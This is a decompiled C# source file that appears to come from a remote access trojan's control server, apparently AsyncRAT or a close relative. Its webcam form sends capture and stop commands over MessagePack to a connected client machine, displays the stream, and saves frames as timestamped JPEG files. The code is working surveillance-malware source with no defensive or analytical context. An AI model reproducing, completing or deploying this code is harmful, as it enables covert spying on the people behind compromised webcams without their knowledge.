using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;

namespace Server.Forms
{
	// Token: 0x02000075 RID: 117
	public partial class FormWebcam : Form
	{
		// Token: 0x17000079 RID: 121
		// (get) Token: 0x060002BE RID: 702 RVA: 0x00020C4D File Offset: 0x0001EE4D
		// (set) Token: 0x060002BF RID: 703 RVA: 0x00020C55 File Offset: 0x0001EE55
		public Form1 F { get; set; }

		// Token: 0x1700007A RID: 122
		// (get) Token: 0x060002C0 RID: 704 RVA: 0x00020C5E File Offset: 0x0001EE5E
		// (set) Token: 0x060002C1 RID: 705 RVA: 0x00020C66 File Offset: 0x0001EE66
		internal Clients Client { get; set; }

		// Token: 0x1700007B RID: 123
		// (get) Token: 0x060002C2 RID: 706 RVA: 0x00020C6F File Offset: 0x0001EE6F
		// (set) Token: 0x060002C3 RID: 707 RVA: 0x00020C77 File Offset: 0x0001EE77
		internal Clients ParentClient { get; set; }

		// Token: 0x1700007C RID: 124
		// (get) Token: 0x060002C4 RID: 708 RVA: 0x00020C80 File Offset: 0x0001EE80
		// (set) Token: 0x060002C5 RID: 709 RVA: 0x00020C88 File Offset: 0x0001EE88
		public string FullPath { get; set; }

		// Token: 0x1700007D RID: 125
		// (get) Token: 0x060002C6 RID: 710 RVA: 0x00020C91 File Offset: 0x0001EE91
		// (set) Token: 0x060002C7 RID: 711 RVA: 0x00020C99 File Offset: 0x0001EE99
		public Image GetImage { get; set; }

		// Token: 0x060002C8 RID: 712 RVA: 0x00020CA2 File Offset: 0x0001EEA2
		public FormWebcam()
		{
			this.InitializeComponent();
		}

		// Token: 0x060002C9 RID: 713 RVA: 0x00020CBC File Offset: 0x0001EEBC
		private void Button1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.button1.Tag == "play")
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "webcam";
					msgPack.ForcePathObject("Command").AsString = "capture";
					msgPack.ForcePathObject("List").AsInteger = (long)this.comboBox1.SelectedIndex;
					msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					this.button1.Tag = "stop";
					this.button1.BackgroundImage = Resources.stop__1_;
					this.numericUpDown1.Enabled = false;
					this.comboBox1.Enabled = false;
					this.btnSave.Enabled = true;
				}
				else
				{
					this.button1.Tag = "play";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "webcam";
					msgPack2.ForcePathObject("Command").AsString = "stop";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
					this.button1.BackgroundImage = Resources.play_button;
					this.btnSave.BackgroundImage = Resources.save_image;
					this.numericUpDown1.Enabled = true;
					this.comboBox1.Enabled = true;
					this.btnSave.Enabled = false;
					this.timerSave.Stop();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060002CA RID: 714 RVA: 0x00020E80 File Offset: 0x0001F080
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x060002CB RID: 715 RVA: 0x00020ED4 File Offset: 0x0001F0D4
		private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					Clients client = this.Client;
					if (client == null)
					{
						return;
					}
					client.Disconnected();
				});
			}
			catch
			{
			}
		}

		// Token: 0x060002CC RID: 716 RVA: 0x00020F08 File Offset: 0x0001F108
		private void BtnSave_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "stop")
			{
				if (this.SaveIt)
				{
					this.SaveIt = false;
					this.btnSave.BackgroundImage = Resources.save_image;
					return;
				}
				this.btnSave.BackgroundImage = Resources.save_image2;
				try
				{
					if (!Directory.Exists(this.FullPath))
					{
						Directory.CreateDirectory(this.FullPath);
					}
					Process.Start(this.FullPath);
				}
				catch
				{
				}
				this.SaveIt = true;
			}
		}

		// Token: 0x060002CD RID: 717 RVA: 0x00020F98 File Offset: 0x0001F198
		private void TimerSave_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
			}
			catch
			{
			}
		}

		// Token: 0x04000296 RID: 662
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x04000297 RID: 663
		public int FPS;

		// Token: 0x04000298 RID: 664
		public bool SaveIt;
	}
}
